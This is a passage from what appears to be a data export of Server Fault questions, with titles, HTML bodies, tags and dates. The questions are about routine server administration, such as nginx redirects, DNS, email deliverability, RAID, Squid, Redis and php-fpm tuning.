<p>In cakephp 3.x the location of index.php is /var/sites/$host/webroot.How can I handle the scenario for multiple locations of index.php in different projects.</p>
","<nginx><cakephp>","2016-04-19 14:30:44"
"862673","Create my own .net domain name","<p>I would like create my own domain with bind9 and which would be accessible from the internet.</p>

<p>It is possible ?</p>

<p>Thanks for reply.</p>
","<debian><bind>","2017-07-18 01:49:00"
"862689","Does SQL licence expire for a single instance?","<p>I have two instances of SQL server namely Adventure and instance 2. Now  I cannot start SQL server from services for Adventure but the instance2 is fine. Once i go through the log file it showed SQL evaluation is expired. </p>

<p>Does SQL licence expire for a single instance?</p>
","<sql-server><sql><evaluation>","2017-07-18 04:01:09"
"862692","Website on godaddy, domain on wix. How can connect specific folder with DNS?","<p>I have many different websites on my godaddy account.
root > folder1
root > folder2
etc.</p>

<p>I understand the basics of pointing the DNS to the godaddy account, but how can I point a domain located on WIX to a specific folder to open which is hosted on godaddy? It won't just know to open that folder one its own just by pointing it to the ip of the godaddy server</p>
","<domain-name-system><godaddy>","2017-07-18 04:18:18"
"941485","Emails go to spam ( Reverse DNS is set , DKIM pass , SPF pass , DMARC pass )","<p>It's been now 3 days that I am struggling with configuring my emails to go to the inbox.</p>

<p>I have a VPS server at OVH and a domain name. I have configured everything in virtualmin with OpenDKIM and Postfix and used various check tools and everything seems okay (as shown in this screenshot from the Gmail email) but the emails still go to spam ( Yahoo, Hotmail , Gmail ).</p>

<p><img src=""https://i.sstatic.net/0iMAJ.png"" alt=""Screenshot of the email&#39;s details received by gmail ""> </p>

<p>Here are the details of a test message sent to Yahoo. As shown, the email is signed and everything seems okay.</p>

<pre><code>X-Apparently-To: nabil.jahir@yahoo.com; Sat, 24 Nov 2018 16:33:22 +0000
Return-Path: &lt;onlineportfolio@onlineportfolio.pro&gt;
X-YahooFilteredBulk: 51.75.31.162
Received-SPF: pass (domain of onlineportfolio.pro designates 51.75.31.162 as permitted sender)
X-YMailISG: UMSYaSMWLDtCAbV4UOzfJPY8yYEmqasl9uS0CNCWQntZxG6M
 Fw6igajRZYFVNN.FU7eUuLVuUbBmv8lFUM0RbkU0s.73TLyFu2IZfAN0ZEov
 yQ.tdV13b.3qc_on.gyqnfa4_19bGlEUb_UUTMULgkfYb0yEoSUqdzy_8CLw
 GwFgHO9neZeCKQ8AvDSXa3g8v_Qa40x7QvK8EAzLLiUJ_Kn8rQotnMwmp7hN
 Zm858LGbPSDCGjYTa361wcT7agiIWwtzynbYu97ZseIEKW2RJbKWbVi59JI1
 C0fl1i_XqyTam52bsd8ql2B_84h9jEGr644BIpltsOA6E4IxP1NAXxdkGGoR
 Y1OxWS94_pFHHR0rZDZXjF2YYJoCApDNqlHrP7ZKxlFYFGyzNuFVjFixd5Ki
 kNZytf0GiOaCGrKDkJBzR3HT1bUK9pwiM2jPAXv0h.PNBWWTOc13p_jSqhEx
 46zsxGpf2l.oIL24OxrXtDwAwth1dAvgHLz_mt_hHXzLuNm1pAJbc4bwS.UL
 wnFkJn9Ldc4tZ7j5YgxznNxSDvvWm7xjPkWNNL.OhfI1N0_GrRxkM0ADPkl2
 YgK6THvVic4s3eLw3E91M8tqpb0zQh3M23yAvi4eaI.nVjweS.Q1LZvybbwI
 W3sNsRGY_Ydhoxpeu0Nzro8jF4OPy6EFYeGcH2T7tDsCCgc0N0ncrRVPkQ27
 9rGqFtRh5yNluX0K9wIGQU2vn63c41D5hLs5WFAlvBficYVE2py0FL5L94.n
 WrFrMqHDgAuEW2Iy6_qPNAWUJDpIJykrsGI2ph9g02KhLzTL4B4S59TH4X8W
 xVgYCu13zRMB7kfcyM0QXZsV1uxSIBi8Ewku3zWuu3lwqfNFDsHU6w6k7P1h
 fVgg_nRNjSXKNT24qqSQUh2jJWFQlanGwKLkhDCpiBxEoQgr84OUo13hdjap
 YnY7ncw1iOBlKudLxJc029WYtH.ukMbMEsa03soD7ihS97rb3tLz6GxrDqo3
 Sq.GP.krEjUdJAAB0VYG63LAmeFAoy6yrDRB60A9Zdlu_IORPautWynT2MNz
X-Originating-IP: [51.75.31.162]
Authentication-Results: mta4434.mail.ne1.yahoo.com  from=onlineportfolio.pro; domainkeys=neutral (no sig);  from=onlineportfolio.pro; dkim=pass (ok)
Received: from 127.0.0.1  (EHLO vps590830.ovh.net) (51.75.31.162)
  by mta4434.mail.ne1.yahoo.com with SMTPS; Sat, 24 Nov 2018 16:33:21 +0000
Received: from onlineportfolio.pro (localhost [127.0.0.1])
    by vps590830.ovh.net (Postfix) with ESMTPA id 1AA6E7F98C
    for &lt;nabil.jahir@yahoo.com&gt;; Sat, 24 Nov 2018 17:33:19 +0100 (CET)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/simple; d=onlineportfolio.pro;
    s=mail; t=1543077199;
    bh=lJB/nYL/lnJN4VoNZZF46fk1OIxhohTSP6uovXwnXY8=;
    h=Date:From:To:Subject;
    b=yocLTdOVKGS8kMbxBeHao07IHZF6tc021mMBro7TTLhfZnDlgIgZesZ1uXHT3cmuQ
     1AJBh0MBHnFt35j1VrlAOT+16qwAjq9QGO3vyHfW3rOSmMAOifU9pv+zsizYHpKno0
     OlQXSplwOwMPxmjaQ7CxqX4BrpPjcJo1+xzaz4dkDXrQ6EU83UEElLseOlrux2k3r5
     OGybMbxkW4uttUYjEhao06GiW5EGsplDfqG67trjOOvg5n7cc54FwxLvKRAa+EC+k8
     085lCvxR8jjeeFQTDpCDInARfBPhYNkk15jgsqMo8HmfC1bRGPcZifzm9WaoZcQCkq
     NzcI1PknzIEmw==
MIME-Version: 1.0
Content-Type: text/plain; charset=US-ASCII;
 format=flowed
Content-Transfer-Encoding: 7bit
Date: Sat, 24 Nov 2018 17:33:19 +0100
From: onlineportfolio &lt;onlineportfolio@onlineportfolio.pro&gt;
To: nabil.jahir@yahoo.com
Subject: Meeting
Message-ID: &lt;ae4b023de1cf4d278e9106fd356c75fc@onlineportfolio.pro&gt;
X-Sender: onlineportfolio@onlineportfolio.pro
User-Agent: Roundcube Webmail/1.3.8
Content-Length: 93

Dear sir,

Thank you very much for you kindness , we appreciate it very much.

Best regards.
</code></pre>
","<email><vps><dkim><spf>","2018-11-24 16:59:20"
"771575","Determine which server in VM environment to forward request to based on host header(s) on one network adapter","<p>As the question title states: I'm trying to figure out how to discern which web server to pass network traffic to based on the host header of said request.  I'm working with one network adapter on the host server, to which all of my guest OS's share.  This setup is both out of necessity (limited hardware available to me) and my desire to learn the technology so that I can leverage my components as much as possible.</p>

<p>Is anyone aware of how I would accomplish this within the same ESXi environment?</p>
","<vmware-esxi><host-headers>","2016-04-20 02:05:56"
"771580","DNS - how does it resolve the name servers itself?","<p>Domain name: abc.com
Name Server: ns1.abc.com and ns2.abc.com</p>

<p>I am running a DNS server and hosting the zone (abc.com) on-premise.</p>

<p>When a client wants to resolve *.abc.com, it will query ns1.abc.com or ns2.abc.com, that is straight forward.</p>

<p>The question is how does it resolve ns1.abc.com before it can sends query to it?</p>
","<domain-name-system><nameserver><resolve>","2016-04-20 02:24:47"
"862835","Server Rack setup, correct?","<p>I plan to build my server inside a rack.
It is pretty simple but not cheap so I wanted to know if everything fits?</p>

<p>Parts:
-<a href=""https://www.amazon.de/Serverschrank-stehende-Schrank-Traglast-RAL7035/dp/B019E8KBI4/ref=pd_sbs_147_2?_encoding=UTF8&amp;psc=1&amp;refRID=P1TXQ5AXDK0GV4JJC39P"" rel=""nofollow noreferrer"">https://www.amazon.de/Serverschrank-stehende-Schrank-Traglast-RAL7035/dp/B019E8KBI4/ref=pd_sbs_147_2?_encoding=UTF8&amp;psc=1&amp;refRID=P1TXQ5AXDK0GV4JJC39P</a></p>

<p>-<a href=""https://www.amazon.de/Realpower-RPS19-450-Geh%C3%A4use-Netzteil-schwarz/dp/B0030UQZ9M/ref=sr_1_3?s=musical-instruments&amp;ie=UTF8&amp;qid=1500072943&amp;sr=8-3&amp;keywords=server+rack+geh%C3%A4use"" rel=""nofollow noreferrer"">https://www.amazon.de/Realpower-RPS19-450-Geh%C3%A4use-Netzteil-schwarz/dp/B0030UQZ9M/ref=sr_1_3?s=musical-instruments&amp;ie=UTF8&amp;qid=1500072943&amp;sr=8-3&amp;keywords=server+rack+geh%C3%A4use</a></p>

<p>A very simple question but I am not an expert and not want to buy the wrong things and waste my money!</p>
","<hardware><rack>","2017-07-18 15:57:02"
"862839","Sharepoint errror accessing files and opening directories in explorer","<p>IT replaced my machine with a more powerful one (same OS Windows 7 64 bit Pro) and I no longer can open any MS Office files from Sharepoint. They provide Office 2010 so no solutions from 2013 apply.</p>

<p>When I click on any Word, Excel or PP document in Sharepoint, the corresponding application starts up, but does not open a document. Instead it throws the following error:</p>

<p><a href=""https://i.sstatic.net/cVE4d.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/cVE4d.png"" alt=""enter image description here""></a></p>

<p>Title: Microsoft Word Security Warning</p>

<p>Message: Certificate Error</p>

<p>Description: The application experienced an internal error loading the SSL libraries.</p>

<p>Button: OK</p>

<p>If instead of opening a file I go to Libraries view and click on Open With Explorer button, another window pops up 3 times regardless of OK or Cancel:</p>

<p><a href=""https://i.sstatic.net/Q1Ou2.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/Q1Ou2.png"" alt=""enter image description here""></a></p>

<p>Title: Select Certificate</p>

<p>The list contains a 2-way SSL cert which every developer has to install in order to debug one of our applications, and one of my co-worker's certificate. My certificate is not in the list, and that co-worker never used this machine.</p>

<p>Buttons: OK, Cancel, View Certificate</p>

<p>Finally it asks for my credentials again and pops up this:</p>

<p><a href=""https://i.sstatic.net/A4ams.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/A4ams.png"" alt=""enter image description here""></a></p>

<p>The IT is not very confident troubleshooting this problem so I am on my own.</p>

<p>Tried solutions from <a href=""https://social.technet.microsoft.com/Forums/en-US/2f455169-dc6a-48ed-b667-ae11dd3d4707/your-client-does-not-support-opening-this-list-with-windows-explorer?forum=sharepointgeneralprevious"" rel=""nofollow noreferrer"">here</a> but none worked. If I disable any sharepoint and grove add-ons in IE, I can download the file fine, but have no way to upload back. Any non-office file opens fine in IE.</p>
","<sharepoint><microsoft-office>","2017-07-18 16:08:42"
"862854","File Server for Small Law Office","<p>I am the de-facto IT guy for a small law office. We need a new file server. </p>

<ul>
<li>We have 7 users.</li>
<li>We have 8 PCs throughout the office, running windows 7, 8, and 10, and one OSX machine. </li>
<li>We have a RICOH copier / scanner that can communicate via SMB.</li>
</ul>

<p>Our previous ""server"" was a windows XP machine that RICOH installed. Despite being a PC, it did its job well and so I never felt the need to mess with it.</p>

<p>The XP machine recently reached the end of its life, so we tried upgrading that PC to something from dell that runs windows 8 home. Now there are issues with communicating over the network -- the RICOH machine cannot write via SMB (it can connect and traverse the directory structure), and the other PCs experience intermittent timeouts when trying to read from the server's network share.</p>

<p>The server has only one job: store and host files for the rest of the office. </p>

<p>I don't need bells-and-whistles like different access permissions for different users; everyone can (and should) be able to read/write everything.</p>

<p>What is the right piece of hardware and software to do this job?</p>
","<windows><networking><windows-server-2008-r2><windows-server-2012>","2017-07-18 17:10:48"
"862885","Dell PowerEdgeServer Case Key Missing","<p>I just got a Dell PowerEdge T330, but a key is needed to open the side panel. I can't find any key in the packaging. Should I contact Dell?</p>
","<dell><dell-poweredge>","2017-07-18 20:43:39"
"862956","HP DL380 G7 - Sometimes won't POST without clearing NVRAM with Maintenance Mode Switches","<p>I have a HP Proliant DL380 G7 Server, actually I have many. They all seem to work just fine and have for years except this box which is giving me a headache. It has been sitting collecting dust for over a year when I had a mission for it, so booted it up. I am noticing some strange things, mostly that on occasion it won't POST. </p>

<p>When it will not POST the fans will turn on to 100% usually and iLO will report than the system is OFF even though the heartbeat is on and obviously the fans are trying to make a tornado. Do a power cycle by actually pulling the plug is the only way to get it out of this state. If I press and hold the power button but keep power to the system, it will just re-enter tornado-heartbeat-but-OFF mode. </p>

<p>After giving it juice again, it will fail to boot, every time. It will turn on, heartbeat starts, all signs are normal. Then after a little bit, all the DIMM LEDs turn on all at once and the system health goes to ""critical"". I am red/green colour blind, so the LEDs are of no help to me other than on or off, but it looks to change from the nice colour to the angry colour. Unplug power again. I can then flip switch 6 on the 10 position switch to get it into maintenance mode. Re-apply power, turn on. Wait 3-4 minutes until I hear it beep meaning it got past POST. Usually at this point I can see video of the HP Logo. Turn it off again. Pull the power again. Flip the switch #6 back to off. Plug the power back in, boot up and all is well. It will run this way seemingly indefinitely until I do some cold boots and at some point will fail spectacularly like this. </p>

<p>My guess is the NVRAM keeps getting corrupted? Bad CMOS battery? Bad Mobo? Ideas?</p>
","<hp-proliant><bios>","2017-07-19 08:03:29"
"772096","554 5.7.1 unknown recipitent","<p>I'm trying to send an email to M@Danielmadison.co.uk (there are no attachments being sent if that would affect anything) and i keep getting the following message:  Delivery to the following recipient failed permanently:</p>

<pre><code> M@danielmadison.co.uk
</code></pre>

<p>Technical details of permanent failure:
Google tried to deliver your message, but it was rejected by the server for the recipient domain danielmadison.co.uk by mxcluster1.one.com. [91.198.169.8].</p>

<p>The error that the other server returned was:
554 5.7.1 : Recipient address rejected: Unknown recipient""</p>

<p>This is coming from the email address:  mailer-daemon@googlemail.com</p>

<p>I am also sending my emails to the domain via GMail.  I've been trying for several days now, and I have no clue what to do, if I'm honest.  Would really appreciate some help</p>
","<email><email-bounces>","2016-04-21 21:57:38"
"772207","Why doesn't my homepage URL contain a trailing slash in the browser address bar?","<p>When I visit my homepage <a href=""https://example.com/"" rel=""nofollow noreferrer"">https://example.com/</a> in a web browser, the trailing slash doesn't appear in the URL when I view it in the browser address bar:</p>

<blockquote>
  <p><a href=""https://example.com"" rel=""nofollow noreferrer"">https://example.com</a></p>
</blockquote>

<p>However, if I now copy the address from the browser address bar (which is <a href=""https://example.com"" rel=""nofollow noreferrer"">https://example.com</a>) and then paste it out in my text editor, I get a trailing slash appear:</p>

<blockquote>
  <p><a href=""https://example.com/"" rel=""nofollow noreferrer"">https://example.com/</a></p>
</blockquote>

<p>Why is the trailing slash absent when I view the URL in the browser address bar, yet not absent when I copy and paste that same URL? I don't believe <code>.htaccess</code> rules can explain this behaviour.</p>
","<url>","2016-04-22 11:33:24"
"772317","PC Randomly crashes with c000021a code","<p>At work we have some PCs that run on Windows XP SP2 (They are segmented away from the internet) and they have been having some issues which strike me as strange, there is 6 PCs that went down, all within 10 mins of each other.
All these PCs present the same issue which is the BSOD with error code c000021a.
Now the first step we thought was a rollback, on 3 PCs this was accomplished, the other 3 for some reason had System restore and checkpoints disabled so no luck there for the other 3.
Another strange issue is if we log in as Administrator some of them do not crash at all, while if we log in as the default user they can crash randomly, we have recreated this user and still the problem persists.
On these PCs is a program called WinCC (For manufacturing) which we suspect maybe causing the crash, but one thing that counteracts this is we have seen safe mode crashes with same error also.
I have googled the error code which seems to be a core windows file that has been damaged, but on these PCs we cannot even use recovery CD as the OS does not seem to detect them, this has also been done via sic /scannow which just presented the error ""Please insert original XP SP2 disc and click retry"" Which we have and still get the error.</p>

<p>We have also imaged one of the PCs (Known to be working) and installed it to a new HDD and a PC which is known for crashing (They are the exact same specs) and still we get the same error code even though the image is taken from a stable and working PC.
We have also ran chkdsk /r /f /x for a full scan and while it said it repaired the filesystem it still continued to crash.</p>

<p>I just find this issue weird as all of them went down with the exact same error close to each other, but there has been no updates to the systems.</p>

<p>Suggestions?</p>

<p>Thanks</p>
","<windows><windows-xp><bsod>","2016-04-22 18:19:47"
"772339","Running LAN services on a router/firewall","<p>So I work in a company where we have a linux machine acting as a router/firewall, and I like all the control you get in this kind of setup compared to having a consumer grade router that ISPs usually give you.</p>

<p>Knowing that, I decided to build a Mini PC to have the same kind of setup in my home, kind of as described in this guide: <a href=""http://arstechnica.com/gadgets/2016/04/the-ars-guide-to-building-a-linux-router-from-scratch/"" rel=""nofollow noreferrer"">http://arstechnica.com/gadgets/2016/04/the-ars-guide-to-building-a-linux-router-from-scratch/</a></p>

<p>So the computer in question would act as a a router, DHCP server and firewall, but I have another linux server already in my home, which runs a Teamspeak service that is accessible from the internet and a few other services that are only for my LAN (a Samba server, for example), and I've read somewhere that it is not advisable to run services that should only be accessible to the LAN on a firewall machine, for security reasons. But it would be way more convenient to have only one machine running both my router services and LAN services such as the Samba server.</p>

<p>The question is: Is there any way I could make this setup work and make this new machine which is going to be the router/firewall run my LAN services in a secure way, making it impossible for the services to be accessible from the web?</p>
","<linux><networking><linux-networking>","2016-04-22 20:00:25"
"863237","My ssh root access disabled. how can i get it back?","<p>i'm very noobs in server. 
I've VPS running centos 7. everything goes normal until i make a mistake.
I want to create a new SSH user to access my VPS. i surf on internet to find the solution and find some setup in sshd_config like this</p>

<pre><code>Port 1234
PermitRootLogin no
AllowUsers jim
</code></pre>

<p>then i save it and restart the server. but now i can access my ssh both with user ""jim"" or root. and now i can't edit that config cause can't login to ssh. does anyone can help me please</p>

<p>Thanks</p>
","<centos><ssh><vps>","2017-07-20 11:56:14"
"772591","Someone else domain is pointed to my IP","<p>I've just done a routine reverse IP check. And saw that 2 domains are pointing to my IP.</p>

<p>This is getting me really worried, as I was told they could be preparing to attack my server.</p>

<p>What exactly can I do about this?</p>
","<linux><nginx><debian><attacks>","2016-04-24 14:14:12"
"863451","Grouping multiple internet lines","<p>I have a multiple internet lines each with a different speed.
I want to Grouping them to be like a on line with all of them speed.
I hear about loadbalancer, it could be possible?</p>
","<networking><load-balancing><bandwidth>","2017-07-21 12:17:14"
"772789","Backbones and subnets","<p>I need some assistance with an assignment I'm doing for college. I think it's pretty easy, but I might be missing something.</p>

<p>The task is to create a network based on the given plan <a href=""https://i.sstatic.net/3JOcT.png"" rel=""nofollow noreferrer"">(click here to see it)</a>. So I've got all the machines (virtual, of course), but somehow I can't get the settings right. For example Client_A, cannot connect to Server_A even though they are on the same subnet (I guess).</p>

<p>Here are the settings:
Server_A: IP-172.25.150.1; Mask-255.255.255.0; Gateway-10.0.2.2.
Client_A: IP-172.25.150.2; Mask-255.255.255.0; Gateway-10.0.2.2.
Server_B: IP-172.25.151.1; Mask-255.255.255.0; Gateway-10.0.2.2.
Client_B: IP-172.25.151.2; Mask-255.255.255.0; Gateway-10.0.2.2.
(10.0.2.2 is the VirtualBox ""router"").</p>

<p>I've tried to Ping Server_A from Client_A and the other way round, but all I get ""Host not reachable"".</p>

<p>What am I doing wrong? :(</p>
","<subnet>","2016-04-25 16:00:31"
"864727","Nginx: redirect to www over https","<p>I'm trying to get the <code>https://domain.ltd</code> redirected to <code>https://www.domain.ltd</code> on Nginx (note the www), here's the config:</p>

<pre><code>server {
    listen 80;
    server_name domain.ltd;
    return 301 https://www.$host$request_uri;
}
server {
    listen 443;
    server_name domain.ltd;
    return 301 https://www.$host$request_uri;
}
server {
    listen 443 ssl;
    server_name www.domain.ltd domain.ltd;
    ...main config goes here
}
</code></pre>

<p>What I found strange is that all other options work fine:</p>

<p><code>http://domain.ltd</code> redirects to <code>https://www.domain.ltd</code></p>

<p><code>http://www.domain.ltd</code> redirects to <code>https://www.domain.ltd</code></p>

<p><code>https://www.domain.ltd</code> works too</p>

<p>But no way for <code>https://domain.ltd</code>, it only shows <code>ERR_CONNECTION_REFUSED</code>.</p>

<p>What's the problem with configuration? How do I solve it?</p>

<p>UPD. I have both www.domain.ltd and domain.ltd included in my SSL cert, so there's no reason not to work</p>
","<nginx><redirect><https>","2017-07-23 17:40:09"
"942083","404 error on Apache server","<p>I have installed Apache, PHP5, and MySQL on my new Linux Lite install for my laptop. I have edited <code>&lt;Directory /&gt;</code> in <code>apache2.conf</code> to look like this:</p>

<pre><code>&lt;Directory /&gt;
        Options Indexes FollowSymLinks Includes ExecCGI
        AllowOverride All
        Require all granted
&lt;/Directory&gt;
</code></pre>

<p>And I have added a new <code>&lt;Directory&gt;</code> tag to point to where I have my files.</p>

<pre><code>&lt;Directory ~/Projects/hcr/&gt;
        Options Indexes FollowSymLinks
        AllowOverride None
        Require all granted
&lt;/Directory&gt;
</code></pre>

<p>I have also changed the <code>DocumentRoot</code> in <code>sites-available/000-default.conf</code> to look this: <code>DocumentRoot ~/Projects/hcr</code></p>

<p>After doing that and restarting Apache, the previous error I was having, which was 403, goes away, but now I get <code>404 Not Found</code> when there is an index.php file located in the directory.</p>
","<linux><php><apache2>","2018-11-29 00:53:26"
"985087","Server - should I add memory?","<p>We have a few servers on Google Cloud Platform. I enabled Google stackdriver and it looks like our Solr servers are consistently at 70%+ memory utilization. We can increase the memory if it is likely to speed up queries (our Solr queries are taking a few hundred milliseconds). I tried free and ps (pagefault ) commands and here is the output.    </p>

<pre><code>free -h -c 5 -s2
              total        used        free      shared       buff/cache   available
Mem:           7.1G        4.7G        134M         37M        2.3G        2.2G
Swap:            9G        2.5G        7.5G
</code></pre>

<p>Output from ps, only first line which is for the Solr process.    </p>

<pre><code>ps -eo min_flt,maj_flt,cmd | sort -nr
623846089 4526790 java -server
</code></pre>

<p>Will increasing memory help?</p>
","<centos7><google-cloud-platform><solr>","2019-09-21 04:30:45"
"864984","Which worth it to use first? Load balance or HTTP cache server?","<p>We have a web application that we are about to take live. But I have a fear that the server won't be able to handle all the requests and it won't be as comfortable to the users as a website should be. Currently I'm thinking about using 2 things. One of them is having 2 more additional servers and use them to loadbalance the users between the servers. So it would be 1 Loadbalanced server, 2 webapplication servers and 1 backend (database) server.</p>

<p>The other thing is HTTP cache. Can it be enough if I just get one more server and set it up as a cache server with NginX? Which would you do if you are limited in terms of resources and why? (Maybe how?)</p>
","<nginx><http><cache>","2017-07-25 07:34:17"
"865029","Freshly installed redis not responding?","<p>I had to install a very old redis-server on a very old Ubuntu server and used the package manager for it. However, after installing and starting the server, I do not get any response but timeouts.</p>

<p><code>redis-cli ping</code>: Timeout</p>

<p>The log only shows this:</p>

<pre><code>[27714] 25 Jul 13:27:59 * Server started, Redis version 2.2.11
[27714] 25 Jul 13:27:59 # WARNING overcommit_memory is set to 0! Background save may fail under low memory condition. To fix this issue add 'vm.overcommit_memory = 1' to /etc/sysctl.conf and then reboot or run the command 'sysctl vm.overcommit_memory=1' for this to take effect.
[27714] 25 Jul 13:27:59 * The server is now ready to accept connections on port 6379
</code></pre>

<p>Does anyone know what could be wrong here?</p>
","<ubuntu><redis><ubuntu-11.10>","2017-07-25 11:31:47"
"865058","Rewrite Nginx with $1 argument","<p>I'm trying to rewrite an url to another one, but i can't use the $1 correctly:</p>

<pre><code>location ~ ^/announce {
    rewrite ^(.*)$1 http://exemple.com/$1/announce.php?ip=$remote_addr&amp;$args;
}
</code></pre>

<p>In fact <code>http://jack.exemple.com:2052/anything/announce</code> should become <code>https://exemple.com/anything/announce.php?ip=$remote_addr&amp;</code></p>

<p>That's work without the <code>$1</code>, but not with args beetwin <code>http://jack.exemple.com:2052/</code> and <code>/announce</code></p>

<p>I think it's something pretty simple, but not so common, and I can't find the good syntax.</p>
","<nginx><rewrite>","2017-07-25 13:41:55"
"942334","Squid 3.5.12 HTTP vs HTTPS Custom Block Page","<p>I have Squid 3.5.12 On Ubuntu Server 16.04.5 LTS</p>

<p>I'm using it to block everything except specific domains listed in whitelist.txt</p>

<p>Everything is working fine except for the blocked page shown to the user:</p>

<p>With <strong>HTTP</strong> it works just fine with <code>ERR_ACCESS_DENIED</code>. It shows that the site is blocked. I edited <code>/usr/share/squid/errors/fr/ERR_ACCESS_DENIED</code> to show a personalized message and it works as expected.</p>

<p>The problem here is with HTTPS, it gives <code>ERR_TUNNEL_CONNECTION_FAILED</code>.</p>

<p>I want to make it show the same message as the <strong>HTTP</strong> does.</p>

<p>Is there a way to do it? Thanks.</p>
","<squid>","2018-11-30 15:22:22"
"985207","Create RAID 5 with 2 new and 2 data disks without losing data","<p>I would like to create a RAID 5 for my file storage. For that purpose, I currently use 2 drives without any RAID configuration. I would like to upgrade to a RAID 5. I want to add 2 new (and empty) disks. Is it possible to create the RAID without me losing data from the 2 almost full disks that I currently use? I know about RAID 1 to RAID 5, but as that does not create a normal RAID 5 I am wondering if there is a better solution to my problem. Thanks for any help.</p>
","<raid><raid5><raid1>","2019-09-22 18:28:20"
"773216","php error [pool www] seems busy (you may need to increase pm.start_servers, or pm.min/max_spare_servers)","<p>I am using ubuntu 15.04 in my dedicated server with 40 cpu cores and 160GB of RAM with one heavy traffic wordpress site running. I am using Nginx as the webserver and varnish as the cache server. My php5-fpm.conf setting is: </p>

<pre><code>listen = 127.0.0.1:7654
pm = dynamic
pm.max_children = 500
pm.start_servers = 80
pm.min_spare_servers = 20
pm.max_spare_servers = 160
pm.max_requests = 1000
</code></pre>

<p>But it is still showing the error:</p>

<pre><code>[pool www] seems busy (you may need to increase pm.start_servers, or pm.min/max_spare_servers), spawning 8 children, there are 17 idle, and 92 total children

WARNING: [pool www] server reached pm.max_children setting (200), consider raising it
</code></pre>

<p>I have tried increasing the numbers but still no luck. 
The memory used by one children is neary <strong>~75MB</strong>. How can I figure out the best configuration for my php?</p>
","<nginx><php-fpm>","2016-04-27 09:07:01"
"942449","Hosting VMs for a final exam","<p>I want to host 20 copies of the same VM for a final exam I am giving in a Computer Science class.  The campus resources have proven extremely unreliable and I'm looking for alternative solutions.  Ideas are:</p>

<ul>
<li>Host them on my home server and direct students there</li>
<li>Go to some commercial cloud service</li>
</ul>

<p>If I host them myself, is there a back-of-the-envelope way to see if my home server has sufficient resources to handle this?</p>

<p>If I host with some provider like AWS (or similar) is the cost manageable (ie, under $50 USD for 20 servers running for 8 hours)?</p>

<p>Are there other solutions I should be considering?</p>
","<virtual-machines><hosting><cloud>","2018-12-01 19:03:06"
"942477","IP/Packets Forwarding","<p>I have searched a lot about IP + Packets forwarding but there was not enough information to find.
Is forwarding only used in case of Virtual Private Networking or it has also other uses? if yes, when are they used? and what is the purpose of them anyway?</p>
","<networking><vpn><ip-forwarding>","2018-12-01 22:36:14"
"985364","Hostname and Operating System - what is the best way to do the scan?","<p>Is it possible to run an Nmap scan that give the output for Operating system and the hostname?
If so what are the flags that needs to be used?</p>
","<nmap>","2019-09-24 01:01:31"
"985389","What is the minimum web storage when creating a 500 user email accounts?","<p>I have a client that needs a website and an email server. Web hosting provider nowadays offers a package of domain registration, web hosting and email hosting.</p>

<p>Now, my client needs to create at least 500 email user accounts. It is a construction company which means the users will be sending/receiving graphical images using their emails which was created with the domain.</p>

<p>Now my question is, what is the minimum web storage of 500 email accounts? Is 20gb web storage will satisfy the 500 users?</p>

<p>Note that the email content is more on images.</p>
","<email-server><storage><web-hosting>","2019-09-24 06:37:38"
"942545","Strange IP routing - ping not working","<p>From my server I can't clone repos from bitbucket.org nor reaching bitbucket.org using ping. Everything worked up to now with the current configuration. </p>

<p>Here is what I found out up to now:</p>

<p>Trying to ping using <a href=""https://ping.eu/ping"" rel=""nofollow noreferrer"">https://ping.eu/ping</a> to bitbucket.org works.</p>

<pre><code>$ ping bitbucket.org 
PING bitbucket.org (18.205.93.0) 56(84) bytes of data.
=&gt; timeout

$ ping google.com
=&gt; works

$ ping apple.com
=&gt; timeout

$ traceroute bitbucket.org
traceroute to bitbucket.org (18.205.93.1), 30 hops max, 60 byte packets
 1  172.29.103.28 (172.29.103.28)  0.035 ms  0.020 ms  0.018 ms
 2  vl-1960.gw-distp-a.kw.nbz.fr.oneandone.net (195.20.243.93)  0.315 ms *  0.312 ms
 3  ae-7.bb-b.bs.kae.de.oneandone.net (195.20.243.7)  0.837 ms  0.856 ms  0.877 ms
 4  ae-5.bb-c.act.fra.de.oneandone.net (212.227.120.19)  2.800 ms  2.812 ms  2.789 ms
 5  ae-2-0.bb-a.fra3.fra.de.oneandone.net (212.227.120.89)  4.947 ms  5.021 ms  5.041 ms
 6  xe-3-1-0-275.fra20.ip4.tinet.net (213.200.65.205)  2.981 ms  3.263 ms  3.234 ms
 7  et-10-3-0.cr4-nyc2.ip4.gtt.net (213.254.214.10)  86.464 ms  86.464 ms  86.400 ms
 8  a100-gw.ip4.gtt.net (173.205.58.70)  86.420 ms  86.446 ms  86.461 ms
 9  52.93.1.85 (52.93.1.85)  88.891 ms 52.93.1.91 (52.93.1.91)  93.428 ms 52.93.1.95 (52.93.1.95)  87.744 ms
10  52.93.1.20 (52.93.1.20)  86.733 ms 52.93.1.52 (52.93.1.52)  86.760 ms 52.93.1.24 (52.93.1.24)  86.703 ms
11  * * *
12  * * *
13  * * *
14  54.239.110.217 (54.239.110.217)  106.686 ms 54.239.110.247 (54.239.110.247)  109.190 ms 54.239.110.205 (54.239.110.205)  113.701 ms
15  54.239.109.181 (54.239.109.181)  91.045 ms 54.239.111.83 (54.239.111.83)  91.948 ms 54.239.109.113 (54.239.109.113)  92.917 ms
16  52.93.24.188 (52.93.24.188)  91.536 ms * 52.93.27.219 (52.93.27.219)  91.989 ms
17  72.21.197.227 (72.21.197.227)  91.062 ms 72.21.197.245 (72.21.197.245)  91.013 ms 72.21.197.249 (72.21.197.249)  91.034 ms
18  * * *
19  * * *
20  * * *
21  * * *
=&gt; continues with asterisks
</code></pre>

<p>What does that mean? Is there a problem in a router far away? Is there a bottleneck to reach bitbucket.org?</p>
","<ip><route><bitbucket>","2018-12-02 16:49:55"
"942563","do i need to build a vm to use a vpn","<p>I want to connect to a custom VPN in google cloud platform, and even potentially route that vpn traffic to a different vpn in a separate region using google cloud services. However, I'm assuming I need to route this traffic through multiple VM instances, thus causing me to purchase more cloud space and build multiple VM instances. Is there a way to use cloud services to access a small partition of their services to build a console that is dedicated to routing my traffic to a VPN in the cloud? I want to build a VPN in a way other than building a VM in the cloud and then creating and connecting a VPN through that VM. Thanks so much.</p>
","<vpn><virtualization><cloud><google>","2018-12-02 19:48:05"
"773333","/var/ or /srv/ for websites","<p>I know it's not the first question on that subject but my purpose is slightly more specific.</p>

